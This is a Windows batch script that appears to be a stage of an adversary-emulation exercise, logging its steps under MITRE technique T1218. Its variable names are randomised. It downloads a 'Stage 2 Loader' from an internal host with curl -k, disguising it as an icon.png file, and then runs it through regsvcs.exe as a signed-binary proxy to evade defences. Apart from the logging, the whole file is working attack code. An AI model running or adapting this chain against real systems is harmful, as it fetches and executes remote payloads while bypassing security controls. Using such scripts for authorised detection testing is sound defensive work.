@echo off
setlocal enabledelayedexpansion

REM SET-var preamble: declare random-named SET vars for every PHR placeholder
SET qphkrm=ITZEL-S2B
SET rybpls=10311
SET tdqcna=7
SET wmzixj=%APPDATA%\10311\054707ae
SET knvyth=c6de2d71.txt
SET gfaqej=https://10.0.0.49/stage/2/icon.png?10311-7
SET hclupo=%APPDATA%\7\macula-simulations.log
SET xdrfsa=%APPDATA%\7
SET vbdnmg=Microsoft.Win32.TaskScheduler.NativeBridge
SET jyotep=Dale
SET ziaklf=https://10.0.0.49

REM Timestamp helper
for /f "tokens=1-6 delims=/:. " %%a in ("%date% %time%") do set tsvar=%%a-%%b-%%c_%%d:%%e:%%f

REM Heartbeat fetch (downloads Stage 2 Loader)
echo [!tsvar!][DEBUG][!qphkrm!][!rybpls!]: heartbeat_start >> "%APPDATA%\!tdqcna!\macula-simulations.log" 2>nul
curl -k -s -o "!wmzixj!\!knvyth!" "!gfaqej!"
echo [!tsvar!][DEBUG][!qphkrm!][!rybpls!]: heartbeat_complete >> "%APPDATA%\!tdqcna!\macula-simulations.log" 2>nul

REM Change directory to output location
cd /d "!wmzixj!"
echo [!tsvar!][DEBUG][!qphkrm!][!rybpls!]: chdir_result=!errorlevel! >> "%APPDATA%\!tdqcna!\macula-simulations.log" 2>nul

REM LOLBIN invocation: regsvcs /U
echo [!tsvar!][DEBUG][!qphkrm!][!rybpls!]: lolbin_start >> "%APPDATA%\!tdqcna!\macula-simulations.log" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U !knvyth! >NUL 2>&1

REM Capture result
set "result=[OK]"
set "error=[]"
if !errorlevel! neq 0 (
    set "result=[FAIL]"
    set "error=[lolbin_execution_failed]"
)

REM TTP completion log
echo [!tsvar!][TTP][!qphkrm!][!rybpls!]: T1218|System Binary Proxy Execution=!result!:!error! >> "%APPDATA%\!tdqcna!\macula-simulations.log" 2>nul

endlocal